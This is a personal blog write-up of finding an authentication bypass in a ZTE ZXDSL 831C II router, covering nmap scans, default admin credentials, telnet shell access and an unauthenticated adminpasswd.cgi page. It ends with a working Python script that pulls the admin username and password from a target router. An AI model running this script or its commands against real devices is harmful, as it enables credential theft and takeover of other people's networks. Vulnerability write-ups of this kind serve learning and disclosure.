---
title: "How I hacked my first router"
description: ""
pubDate: 2021-01-03T21:06:22+03:00
draft: false
categories: ["Hacking"]
tags: ["hacking", "router", "ZTE", "exploit"]
---

# How I Hacked My First Router

I have never found a real vulnerability in the "real world" before. I was just playing CTFs and 
Wargames. One day I was looking through our old stuff, and I stumbled up on this router the 
`ZTE - ZXDSL 831C II`,
and had heard before that this router has a vulnerability. So I thought this would be the perfect chance.
I set it up and started pwning.

## Scannig with Nmap

Once every hacker is on a network, it's obvious what they do, they always run nmap. Let's run nmap scan
on the router and save the result to a file. We will perform a service scan, and also run the default scripts. Will
use `sudo` to make nmap go faster.

```bash
sudo nmap -sC -sV -oA router.txt 192.168.1.1
```

While we check for the result it's a good idea to run another scan of all ports.

```bash
sudo nmap -sC -sV -p- -oA router_allports.txt 192.168.1.1
```

Let's inspect the output of the first command.


## Results

The result of the first nmap scan looks like this.

{{< figure src="./pic/2021-01-04_19-55.png" title="Nmap Scan" >}}

### Port 80

In the scan we can see that there are some ports open. Let's inspect port 80 first.

{{< figure src="./pic/2021-01-04_20-03.png" title="Login Page" >}}

It appears to be a web interface. The defualt username and password is `admin`, 
put that in and you will get this. Now my target shifted to being
able to gain the source code of this web application.


{{< figure src="./pic/2021-01-04_20-05.png" title="Web Interface" >}}

We will use the managemnt tab to change the username and password to demonstrate the attack.

{{< figure src="./pic/2021-01-04_20-06.png" title="" >}}

### Port 23

If we go back to our nmap scan we see that there is a port 23 open which is telnet, and uses
the same username and password as the web application. We can use the following command to
login.

```bash
telnet 192.168.1.1 23
```

{{< figure src="./pic/2021-01-04_20-08.png" title="telnet" >}}

After logging in you can issue some command to manage the router, and if you type in `help`
you will get a list of commands you can use. I was interested in the `sh` command which will
give you a linux shell.

After getting a shell I immediately run the `ls` command to see what's there.

{{< figure src="./pic/2021-01-04_20-10.png" title="ls" >}}

This is a listing of the root directory. The directory I was particularly interested in was
the `webs` directory. I went into the `webs` directory and searched for any file which 
contains the `passwd` word in it and I found two.

{{< figure src="./pic/2021-01-04_20-11.png" title="passwd" >}}

You can `cat` the contents of any file in this directory.

## Finding The Vulnerability

I was interested in the contents of the `adminpasswd.html`. Here is the source code.

```html
<html>
<head>
        <meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <link rel="stylesheet" href='stylemain.css' type='text/css'>
        <link rel="stylesheet" href='colors.css' type='text/css'>
        <script language="javascript" src="util.js"></script>
        <script language="javascript" >
<!-- hide

nameAdmin = '<%ejGet(sysUserName)%>';
pwdAdmin = '<%ejGet(sysPassword)%>';

function frmLoad()
{
    with ( document.forms[0] )
    {
        sysUserName.value = nameAdmin;
        sysPassword.value = pwdAdmin;
        cfmPwd.value = pwdAdmin;
    }
}

function btnApplyAdmin()
{
    var loc = 'adminpasswd.cgi?action=save&';
    with ( document.forms[0] )
    {
        if(sysUserName.value ==  '<%ejGet(usrUserName)%>')
        {
            alert("Don't make such names!Please change it!\n ");
            return;
        }
                
                        if ( isIncludeInvalidChar(sysUserName.value) ) 
                {
                 alert('Invalide characters in user name.');
                 return;
            }

                if ( isIncludeInvalidChar(sysPassword.value) ) 
                {
                 alert('Invalide characters in password.');
                 return;
            }

        if ( sysUserName.value.length == 0 ) 
        {
             alert('Admin Account and Password can\'t be empty.');
             return;
        }        
        if ( sysUserName.value.indexOf(' ') != -1 ) 
        {
             alert('Admin Accout can\'t contain a space.');
             return;
        }
        if ( sysPassword.value.indexOf(' ') != -1 ) 
        {
            alert('Password can\'t contain a space.');
            return;
        }
        if ( sysUserName.value.length > 15 )
        {
            alert( 'Admin  Account  should not be longer the 15 characters!' );
            return;
        }
        if ( sysPassword.value.length > 32 )
        {
            alert ('Password should not be longer than 32 characters.');
            return;
        }
        if ( sysPassword.value != cfmPwd.value )
        {
            alert("The passwords do not match.");
            return;
        }
        if ( sysPassword.value.length == 0 ) 
        {
             alert('Admin Accout and Password cannot be empty.');
             return;
        }
        loc += 'sysUserName=' + encodeUrl(sysUserName.value) + '&';
        loc += 'sysPassword=' + encryptPassword(encodeUrl(sysPassword.value)); //lvwz
        
        var code = 'location.assign("' + loc + '")';
        eval(code);
        
    }
}


-->
        </script>
</head>

<body onLoad='frmLoad()'>
<form>
<strong>Admin Account</strong> <BR>
<BR>
<TABLE cellSpacing="0" cellPadding="0" border="0">
  <TBODY>
    <TR>
      <TD width="590">Admin account has unrestricted access to change and view configuration of your ADSL<br> router. </TD>
    </TR>
  </TBODY>
</TABLE>
<BR>
<TABLE cellSpacing="0" cellPadding="0" border="0">
  <TBODY>
    <TR height="30">
      <TD width="150">User Name:</TD>
      <TD><INPUT maxLength="63"  size="30"   name="sysUserName"></TD>
    </TR>
    <TR height="30">
      <TD>New Password:</TD>
      <TD><INPUT type="password" maxLength="32" size="30"  name="sysPassword"></TD>
    </TR>
    <TR height="30">
      <TD>Confirm New Password:</TD>
      <TD><INPUT type="password" maxLength="32" size="30"  name="cfmPwd"></TD>
    </TR>
  </TBODY>
</TABLE>
<BR>
<TABLE width="500" border="0">
  <TBODY>
    <TR>
      <TD align="left" width="494"><INPUT name="button" type="button" onClick="btnApplyAdmin()" value="Apply">
      </TD>
    </TR>
  </TBODY>
</TABLE>
</form>
</body>
</html>
```

This is the page used by the router to change the username and password to access the router.
The one I showed you earlier. 

You might ask "couldn't you just inspect the elements, while you were authenticated, and get the 
source code ?". That would be a valid question, and my answer would be "because I'm an idot,
and I prefer doing stuff the hard way".

Anyways if you try to access this site without creds, you would get access denied. 

Take note here though, On lines `11`
, and `12` The page stores two variables called `nameAdmin`, and `pwdAdmin`, which are 
populated by the cgi script by the looks of `<%ejGet(sysUserName)%>`.

On line `26` you would see where this page submits the creds to. It submits them to
`adminpasswd.cgi`. After searching a lot for the source code of this cgi script, I couldn't
find it anywhere, and I was avoiding googing for it, because I was afraid of spoilers.

Finally I decided to visit the cgi script directly. I was shocked, I thought maybe the
cookies from my earlier authentication might have had an effect. So I opened a new 
browser (qutebrowser), try again, and boom no need to authenticate to access this page.

{{< figure src="./pic/2021-01-05_20-10.png" title="Accessing the cgi script" >}}
We can change the username, and password, and access the page boom hacked, but wait there
is more

If you're curious enough you wouldn't stop there you would dig for more. So let's dig some
more.

Obviously any site asks for the old password to check if you are who you say you are.
This page does the checking on the client side, in the open. Which means you can just 
snatch the username and password.


{{< figure src="./pic/2021-01-05_20-12.png" title="Inspecting the page" >}}

I wrote a script to do just that.

```python
#!/usr/bin/env python

# This script extracts the Username and Password of the `ZTE - ZXDSL 831C II` 
# modem. 

# This script can only be used on a system you have the authority to 
# execute such scripts on. If you did this attack on a system you don't 
# have authority on I'm not held responsible. Do so on your own risk.

# author: Omer Abdulaziz
# email: omerabdi@pm.me

import requests
import sys
import re

host = "192.168.1.1"

try:
    host = sys.argv[1]
except:
    pass

try:
    print(f"[*] Attacking {host} ...")
    response = requests.get(f"http://{host}/adminpasswd.cgi")
except:
    print("[!] Network error")
    sys.exit(2)

if response.status_code == 200:
    userna = re.search("nameAdmin = '.*'", response.text).group().split("'")[1]
    passwd = re.search("pwdAdmin = '.*'", response.text).group().split("'")[1]

    print(f"[=] Username: {userna}")
    print(f"[=] Password: {passwd}")
    sys.exit()

else:
    print("[!] It appears the target is not vulnerable")
    sys.exit(1)
```

Running the script. The script runs on the `192.168.1.1` target by default, but you can
change by supplying the target of your choice.

```bash
python exp.py

# or give it any other target
python exp.py 10.0.0.1
```

{{< figure src="./pic/2021-01-04_20-18.png" title="Running the exploit" >}}

Inspired by malwaretech's "[How I Found My First Ever ZeroDay (in RDP)](https://www.malwaretech.com/2020/12/how-i-found-my-first-ever-zeroday-in-rdp.html)" post.
